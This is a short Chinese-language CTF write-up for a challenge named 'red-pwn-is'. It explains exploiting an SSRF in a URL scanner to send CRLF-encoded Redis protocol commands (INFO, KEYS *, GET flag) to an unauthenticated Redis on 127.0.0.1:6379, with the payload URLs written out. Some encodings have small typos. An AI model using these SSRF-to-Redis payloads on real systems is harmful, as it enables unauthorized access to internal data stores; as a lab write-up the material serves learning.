red-pwn-is

题目给出了一个输入，可以扫描输入的url，猜测存在SSRF，经过测试仅仅允许http协议，在使用其他协议时返回：

开始没有什么思路，根据提示，hint: red-pwn-is could be better thought of as red-is-pwn，想到可能是redis的问题。

感觉进行尝试，果然发现问题：

在redid的默认配置中，会开放一个没有验证的TCP/6379端口，并且会尝试去解析处理每一次输入(直到超时或者输入’QUIT’命令退出)，对于那些不存在的命令，则会显示像”-ERR unknown command”这样的输出。

通过这篇文章的介绍，了解了一些语法。

  • everything is separated with new lines (here CRLF)
  • a command starts with ‘‘ and the number of arguments (“1” + CRLF)
  • then we have the arguments, one by one:
    • string: the ‘$’ character + the string size (“$4” + CRLF) + the string value (“TIME” + CRLF)
    • integer: the ‘:’ character + the integer in ASCII (“:42” + CRLF)

来看一下服务器信息：http://127.0.0.1:6379/%0d%0a*1%0d%0a$4%0d%0aINFO%0d%0a

真实的payload为：*1 $4 INFO（*1\r\n$4\r\nINFO\r\n）。

注意：每一个命令的结尾都应该是\r\n，进行URL编码后是%0d%0a。

编码为：http://127.0.0.1:6379/%0d%0a*2%0d%0a$4%0d%0aKEYS%0d%0a$1%0d%0a*0d%0a

编码为：http://127.0.0.1:6379/%0d%0a*2%0d%0a$3%0d%0aGET%0d%0a$4%0d%0aflag0d%0a
